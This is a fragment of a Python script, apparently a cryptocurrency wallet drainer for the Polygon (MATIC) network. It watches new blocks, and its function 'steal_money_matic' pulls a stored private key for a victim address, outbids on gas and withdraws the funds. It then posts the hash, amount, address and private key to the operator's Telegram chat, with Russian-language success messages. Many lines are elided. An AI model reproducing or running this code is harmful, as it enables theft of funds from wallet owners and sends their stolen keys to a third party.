...
from config import send_address, matic_grab, matic_vhod, YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN
...
web3 = Web3(Web3.HTTPProvider(matic_vhod))
...
def getblocks_matic():
    ...
    while True:
        ...
        if str(latestBlock.number) in blocks_matic:
            ...
            print(f'Last Block! {str(latestBlock.number)} | MATIC')
...
def steal_money_matic(address):
    ...
    try:
        ...
        gwei = web3.eth.gas_price + 10000000000


        wallet_key = db.get_info_address(address)
        grab_from_matic_balance = web3.toWei(matic_grab, 'ether')
        ...
        success_message = f' ✅✅✅  УСПЕШНЫЙ ВЫВОД MATIC  ✅✅✅ \n \n ХЕШ: {hash_xd}   \n \n 💰💰💰 СУММА: {amount_ether} 💰💰💰  \n \n АДРЕС: {address} \n \n ПРИВАТ: {wallet_key}'
        print(success_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=success_message)
    except Exception as e:
        error_message = f'MATIC | НЕУСПЕШНЫЙ ВЫВОД | АДРЕС: {address} | ОШИБКА: {e}'
        print(error_message)
